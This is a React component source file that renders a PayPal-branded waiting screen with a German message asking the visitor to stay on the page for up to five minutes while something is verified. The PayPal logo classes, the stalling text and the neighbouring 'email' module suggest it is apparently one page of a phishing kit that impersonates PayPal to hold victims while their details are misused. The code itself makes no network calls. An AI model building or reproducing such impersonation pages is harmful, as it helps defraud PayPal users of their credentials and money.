import React from 'react';
import classes from "../email/Email.module.css";
import loader from "../../assets/loader.gif";

const Infinity = () => {
    return (
        <div className={classes.corral}>
            <div className={[classes.contentContainerBordered].join(' ')}
                 style={{border: '0px'}}>
                <header>
                    <p role={"img"}
                       className={[classes.paypal_logo, classes.paypal_logo_long, classes.signin_paypal_logo].join(' ')}></p>
                </header>
                <div className={classes.final_title}>
                    Wir brauchen etwas Zeit zum Uberprufen, bleiben Sie auf der Seite, es wird nicht langer als 5 Minuten dauern
                </div>
                <div style={{marginLeft: "40%"}}>
                    <img src={loader}/>
                </div>
                <div className={classes.intentFooter}>
                    <div className={classes.localeSelector}>
                        <span className={[classes.picker, classes.country_selector].join(' ')}>
                            <button className={[classes.country ,classes.RU].join(' ')}>
                            </button>
                        </span>
                        <ul className={classes.localeLink}>
                            <li>
                                <a className={classes.selected}>Deutsch</a>
                            </li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    );
};

export default Infinity;